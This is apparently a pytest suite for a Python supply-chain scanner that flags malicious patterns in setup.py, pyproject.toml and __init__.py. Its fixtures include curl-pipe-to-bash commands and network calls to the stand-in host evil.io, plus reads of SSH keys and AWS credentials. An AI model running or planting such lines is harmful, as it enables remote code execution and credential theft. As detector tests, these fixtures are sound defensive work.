"""Tests for the Python supply chain scanner.

Covers:
  - setup.py: subprocess, os.system, eval/exec, network calls, base64, sensitive file reads
  - pyproject.toml: unknown build backends, suspicious build deps, inline build scripts
  - __init__.py: network calls at import time, eval/exec, sys.path manipulation,
    builtins overrides, subprocess at import time
  - Integration with pth_scanner (combined scan)
  - scan_python_supply_chain entrypoint
  - CLI: scan-python command
  - PythonScanResult properties
  - Depth limiting for __init__.py
"""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from agentward.scan.python_scanner import (
    PythonFinding,
    PythonScanResult,
    analyze_init_py,
    analyze_pyproject_toml,
    analyze_setup_py,
    scan_python_supply_chain,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write(path: Path, content: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(content), encoding="utf-8")
    return path


# ---------------------------------------------------------------------------
# PythonScanResult properties
# ---------------------------------------------------------------------------


class TestPythonScanResult:
    def test_empty_result(self) -> None:
        r = PythonScanResult()
        assert not r.has_critical
        assert not r.has_warning
        assert r.critical_count == 0
        assert r.warning_count == 0

    def test_has_critical(self) -> None:
        r = PythonScanResult(findings=[
            PythonFinding(
                severity="CRITICAL",
                file="setup.py",
                file_type="setup.py",
                line_number=1,
                pattern="eval_exec",
                evidence="eval(x)",
                description="d",
            )
        ])
        assert r.has_critical
        assert r.critical_count == 1

    def test_has_warning(self) -> None:
        r = PythonScanResult(findings=[
            PythonFinding(
                severity="WARNING",
                file="pyproject.toml",
                file_type="pyproject.toml",
                line_number=None,
                pattern="unknown_build_backend",
                evidence="e",
                description="d",
            )
        ])
        assert r.has_warning
        assert r.warning_count == 1


# ---------------------------------------------------------------------------
# setup.py CRITICAL pattern tests
# ---------------------------------------------------------------------------


class TestSetupPyCritical:
    def _check_critical(self, code: str, expected_pattern: str, tmp_path: Path) -> None:
        f = tmp_path / "setup.py"
        _write(f, code)
        findings = analyze_setup_py(f)
        critical = [x for x in findings if x.severity == "CRITICAL"]
        patterns = [x.pattern for x in critical]
        assert expected_pattern in patterns, (
            f"Expected {expected_pattern!r} in {patterns} for code: {code!r}"
        )

    def test_subprocess_popen(self, tmp_path: Path) -> None:
        self._check_critical(
            "import subprocess\nsubprocess.Popen(['ls', '-la'])",
            "subprocess_exec",
            tmp_path,
        )

    def test_subprocess_run(self, tmp_path: Path) -> None:
        self._check_critical(
            "subprocess.run(['whoami'], capture_output=True)",
            "subprocess_exec",
            tmp_path,
        )

    def test_subprocess_check_output(self, tmp_path: Path) -> None:
        self._check_critical(
            "result = subprocess.check_output(['cat', '/etc/passwd'])",
            "subprocess_exec",
            tmp_path,
        )

    def test_os_system(self, tmp_path: Path) -> None:
        self._check_critical(
            "os.system('curl https://evil.io/payload | bash')",
            "os_system",
            tmp_path,
        )

    def test_os_popen(self, tmp_path: Path) -> None:
        self._check_critical(
            "result = os.popen('whoami').read()",
            "os_system",
            tmp_path,
        )

    def test_eval_call(self, tmp_path: Path) -> None:
        self._check_critical("eval(encoded_payload)", "eval_exec", tmp_path)

    def test_exec_call(self, tmp_path: Path) -> None:
        self._check_critical("exec(open('payload.py').read())", "eval_exec", tmp_path)

    def test_compile_call(self, tmp_path: Path) -> None:
        self._check_critical("compile(src, '<string>', 'exec')", "eval_exec", tmp_path)

    def test_urllib_request(self, tmp_path: Path) -> None:
        self._check_critical(
            "urllib.request.urlopen('https://evil.io/dropper')",
            "network_urllib",
            tmp_path,
        )

    def test_requests_get(self, tmp_path: Path) -> None:
        self._check_critical(
            "requests.get('https://evil.io/cmd')",
            "network_urllib",
            tmp_path,
        )

    def test_https_connection(self, tmp_path: Path) -> None:
        self._check_critical(
            "conn = HTTPSConnection('evil.io')\nconn.request('GET', '/payload')",
            "network_urllib",
            tmp_path,
        )

    def test_base64_decode(self, tmp_path: Path) -> None:
        self._check_critical(
            "payload = base64.b64decode(encoded_str)",
            "base64_payload",
            tmp_path,
        )

    def test_long_base64_literal(self, tmp_path: Path) -> None:
        b64 = "A" * 50 + "=="
        self._check_critical(f"data = '{b64}'", "base64_payload", tmp_path)

    def test_sensitive_file_ssh(self, tmp_path: Path) -> None:
        self._check_critical(
            "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()",
            "sensitive_file_read",
            tmp_path,
        )

    def test_sensitive_file_aws(self, tmp_path: Path) -> None:
        self._check_critical(
            "creds = open('~/.aws/credentials').read()",
            "sensitive_file_read",
            tmp_path,
        )

    def test_dynamic_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "__import__('subprocess').Popen(['bash'])",
            "dynamic_import",
            tmp_path,
        )

    def test_file_write_to_etc(self, tmp_path: Path) -> None:
        self._check_critical(
            "open('/etc/cron.d/evil', 'w').write('* * * * * root curl ...')",
            "file_write_outside_package",
            tmp_path,
        )


class TestSetupPyClean:
    def test_minimal_setup_py_no_findings(self, tmp_path: Path) -> None:
        f = tmp_path / "setup.py"
        _write(f, """
from setuptools import setup
setup(name="mypkg", version="1.0.0")
""")
        findings = analyze_setup_py(f)
        assert not any(x.severity == "CRITICAL" for x in findings)

    def test_nonexistent_file(self, tmp_path: Path) -> None:
        findings = analyze_setup_py(tmp_path / "nonexistent.py")
        assert findings  # Should get a stat_error warning


# ---------------------------------------------------------------------------
# pyproject.toml tests
# ---------------------------------------------------------------------------


class TestPyprojectToml:
    def test_known_backend_no_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["setuptools>=61"]
build-backend = "setuptools.build_meta"

[project]
name = "mypkg"
version = "1.0.0"
""")
        findings = analyze_pyproject_toml(f)
        assert not any(x.pattern == "unknown_build_backend" for x in findings)

    def test_unknown_backend_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["malicious-builder"]
build-backend = "malicious_builder.api"

[project]
name = "mypkg"
version = "1.0.0"
""")
        findings = analyze_pyproject_toml(f)
        assert any(x.pattern == "unknown_build_backend" for x in findings)

    def test_requests_as_build_dep_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["setuptools", "requests"]
build-backend = "setuptools.build_meta"
""")
        findings = analyze_pyproject_toml(f)
        assert any(x.pattern == "suspicious_build_dep" for x in findings)

    def test_urllib3_as_build_dep_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["setuptools", "urllib3"]
build-backend = "setuptools.build_meta"
""")
        findings = analyze_pyproject_toml(f)
        assert any(x.pattern == "suspicious_build_dep" for x in findings)

    def test_no_build_system_section_no_crash(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[project]
name = "mypkg"
version = "1.0.0"
""")
        findings = analyze_pyproject_toml(f)
        assert isinstance(findings, list)

    def test_invalid_toml_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        f.write_text("NOT VALID TOML ][[[", encoding="utf-8")
        findings = analyze_pyproject_toml(f)
        assert findings  # parse_error warning

    def test_hatchling_backend_no_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"
""")
        findings = analyze_pyproject_toml(f)
        assert not any(x.pattern == "unknown_build_backend" for x in findings)

    def test_flit_backend_no_warning(self, tmp_path: Path) -> None:
        f = tmp_path / "pyproject.toml"
        _write(f, """
[build-system]
requires = ["flit_core"]
build-backend = "flit_core.buildapi"
""")
        findings = analyze_pyproject_toml(f)
        assert not any(x.pattern == "unknown_build_backend" for x in findings)


# ---------------------------------------------------------------------------
# __init__.py tests
# ---------------------------------------------------------------------------


class TestInitPyCritical:
    def _check_critical(self, code: str, expected_pattern: str, tmp_path: Path) -> None:
        f = tmp_path / "__init__.py"
        _write(f, code)
        findings = analyze_init_py(f)
        critical = [x for x in findings if x.severity == "CRITICAL"]
        patterns = [x.pattern for x in critical]
        assert expected_pattern in patterns, (
            f"Expected {expected_pattern!r} in {patterns}"
        )

    def test_urllib_urlopen(self, tmp_path: Path) -> None:
        self._check_critical(
            "urllib.request.urlopen('https://evil.io')",
            "network_on_import",
            tmp_path,
        )

    def test_requests_get(self, tmp_path: Path) -> None:
        self._check_critical(
            "requests.get('https://evil.io/collect')",
            "network_on_import",
            tmp_path,
        )

    def test_socket_connect(self, tmp_path: Path) -> None:
        self._check_critical(
            "s.connect(('evil.io', 1234))",
            "network_on_import",
            tmp_path,
        )

    def test_eval_on_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "eval(payload)",
            "eval_exec_on_import",
            tmp_path,
        )

    def test_exec_on_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "exec(open('payload.py').read())",
            "eval_exec_on_import",
            tmp_path,
        )

    def test_base64_decode_on_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "code = base64.b64decode(payload)",
            "base64_on_import",
            tmp_path,
        )

    def test_subprocess_on_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "subprocess.Popen(['bash', '-c', 'cmd'])",
            "subprocess_on_import",
            tmp_path,
        )

    def test_os_system_on_import(self, tmp_path: Path) -> None:
        self._check_critical(
            "os.system('curl https://evil.io/x | bash')",
            "os_system_on_import",
            tmp_path,
        )

    def test_sensitive_file_ssh(self, tmp_path: Path) -> None:
        self._check_critical(
            "key = open('~/.ssh/id_rsa').read()",
            "sensitive_file_read_on_import",
            tmp_path,
        )


class TestInitPyWarning:
    def _check_warning(self, code: str, expected_pattern: str, tmp_path: Path) -> None:
        f = tmp_path / "__init__.py"
        _write(f, code)
        findings = analyze_init_py(f)
        warnings = [x for x in findings if x.severity == "WARNING"]
        patterns = [x.pattern for x in warnings]
        assert expected_pattern in patterns, f"Expected {expected_pattern!r} in {patterns}"

    def test_sys_path_append(self, tmp_path: Path) -> None:
        self._check_warning(
            "import sys\nsys.path.append('/evil/path')",
            "sys_path_manipulation",
            tmp_path,
        )

    def test_sys_path_insert(self, tmp_path: Path) -> None:
        self._check_warning(
            "sys.path.insert(0, '/malicious')",
            "sys_path_manipulation",
            tmp_path,
        )

    def test_builtins_override(self, tmp_path: Path) -> None:
        self._check_warning(
            "import builtins\nbuiltins.print = evil_print",
            "code_injection_builtin",
            tmp_path,
        )

    def test_dynamic_import(self, tmp_path: Path) -> None:
        self._check_warning(
            "__import__('subprocess').call(['bash'])",
            "dynamic_import_on_init",
            tmp_path,
        )


class TestInitPyClean:
    def test_empty_init_no_findings(self, tmp_path: Path) -> None:
        f = tmp_path / "__init__.py"
        f.write_text("", encoding="utf-8")
        findings = analyze_init_py(f)
        assert findings == []

    def test_simple_version_assignment_no_findings(self, tmp_path: Path) -> None:
        f = tmp_path / "__init__.py"
        _write(f, "__version__ = '1.0.0'\n__all__ = ['MyClass']")
        findings = analyze_init_py(f)
        assert not any(x.severity == "CRITICAL" for x in findings)

    def test_normal_imports_no_findings(self, tmp_path: Path) -> None:
        f = tmp_path / "__init__.py"
        _write(f, "from .module import MyClass\nfrom .utils import helper\n")
        findings = analyze_init_py(f)
        assert not any(x.severity == "CRITICAL" for x in findings)


# ---------------------------------------------------------------------------
# scan_python_supply_chain integration tests
# ---------------------------------------------------------------------------


class TestScanPythonSupplyChain:
    def test_nonexistent_directory(self, tmp_path: Path) -> None:
        result = scan_python_supply_chain(tmp_path / "nonexistent")
        assert result.errors

    def test_empty_directory_no_findings(self, tmp_path: Path) -> None:
        result = scan_python_supply_chain(tmp_path)
        assert not result.has_critical
        assert result.files_scanned == 0

    def test_scans_setup_py(self, tmp_path: Path) -> None:
        _write(tmp_path / "setup.py", "eval(payload)")
        result = scan_python_supply_chain(tmp_path)
        assert result.has_critical
        assert any(f.file_type == "setup.py" for f in result.findings)

    def test_scans_pyproject_toml(self, tmp_path: Path) -> None:
        _write(tmp_path / "pyproject.toml", """
[build-system]
requires = ["evil-builder"]
build-backend = "evil.build"
""")
        result = scan_python_supply_chain(tmp_path)
        assert any(f.file_type == "pyproject.toml" for f in result.findings)

    def test_scans_init_py(self, tmp_path: Path) -> None:
        _write(tmp_path / "mypkg" / "__init__.py", "eval(payload)")
        result = scan_python_supply_chain(tmp_path)
        assert result.has_critical
        assert any(f.file_type == "__init__.py" for f in result.findings)

    def test_skips_venv_directory(self, tmp_path: Path) -> None:
        venv_setup = tmp_path / ".venv" / "lib" / "site-packages" / "evil" / "setup.py"
        _write(venv_setup, "eval(payload)")
        result = scan_python_supply_chain(tmp_path)
        # Should not flag setup.py inside .venv
        venv_findings = [f for f in result.findings if ".venv" in f.file]
        assert not venv_findings

    def test_depth_limit_for_init_py(self, tmp_path: Path) -> None:
        # Create __init__.py at depth 5 (deeper than default limit of 3)
        deep_init = tmp_path / "a" / "b" / "c" / "d" / "e" / "__init__.py"
        _write(deep_init, "eval(payload)")
        result = scan_python_supply_chain(tmp_path, max_init_py_depth=3)
        # The deep init.py should not be scanned
        deep_findings = [f for f in result.findings if "a/b/c/d/e" in f.file or "a\\b\\c\\d\\e" in f.file]
        assert not deep_findings

    def test_files_scanned_count(self, tmp_path: Path) -> None:
        _write(tmp_path / "setup.py", "from setuptools import setup; setup()")
        _write(tmp_path / "pyproject.toml", "[project]\nname='x'\nversion='1.0'")
        _write(tmp_path / "mypkg" / "__init__.py", "__version__ = '1.0'")
        result = scan_python_supply_chain(tmp_path)
        assert result.files_scanned >= 3

    def test_selective_scan_setup_only(self, tmp_path: Path) -> None:
        _write(tmp_path / "setup.py", "eval(x)")
        _write(tmp_path / "mypkg" / "__init__.py", "eval(y)")
        result = scan_python_supply_chain(
            tmp_path,
            include_setup_py=True,
            include_pyproject=False,
            include_init_py=False,
        )
        assert any(f.file_type == "setup.py" for f in result.findings)
        assert not any(f.file_type == "__init__.py" for f in result.findings)

    def test_selective_scan_init_only(self, tmp_path: Path) -> None:
        _write(tmp_path / "setup.py", "eval(x)")
        _write(tmp_path / "mypkg" / "__init__.py", "eval(y)")
        result = scan_python_supply_chain(
            tmp_path,
            include_setup_py=False,
            include_pyproject=False,
            include_init_py=True,
        )
        assert not any(f.file_type == "setup.py" for f in result.findings)
        assert any(f.file_type == "__init__.py" for f in result.findings)


# ---------------------------------------------------------------------------
# CLI tests
# ---------------------------------------------------------------------------


class TestScanPythonCLI:
    def test_scan_python_command_runs(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner
        from agentward.cli import app

        runner = CliRunner()
        result = runner.invoke(app, ["scan-python", str(tmp_path)])
        assert result.exit_code == 0

    def test_scan_python_json_output(self, tmp_path: Path) -> None:
        import json as _json
        from typer.testing import CliRunner
        from agentward.cli import app

        runner = CliRunner()
        result = runner.invoke(app, ["scan-python", "--json", str(tmp_path)])
        assert result.exit_code == 0
        data = _json.loads(result.output)
        assert "files_scanned" in data
        assert "findings" in data

    def test_scan_python_exits_2_on_critical(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner
        from agentward.cli import app

        _write(tmp_path / "setup.py", "eval(payload)")

        runner = CliRunner()
        result = runner.invoke(app, ["scan-python", str(tmp_path)])
        assert result.exit_code == 2

    def test_scan_python_clean_exits_0(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner
        from agentward.cli import app

        runner = CliRunner()
        result = runner.invoke(app, ["scan-python", str(tmp_path)])
        assert result.exit_code == 0

    def test_scan_python_json_findings_have_required_fields(self, tmp_path: Path) -> None:
        import json as _json
        from typer.testing import CliRunner
        from agentward.cli import app

        _write(tmp_path / "setup.py", "eval(x)")

        runner = CliRunner()
        result = runner.invoke(app, ["scan-python", "--json", str(tmp_path)])
        data = _json.loads(result.output)
        if data["findings"]:
            f = data["findings"][0]
            assert "severity" in f
            assert "file_type" in f
            assert "pattern" in f
            assert "description" in f
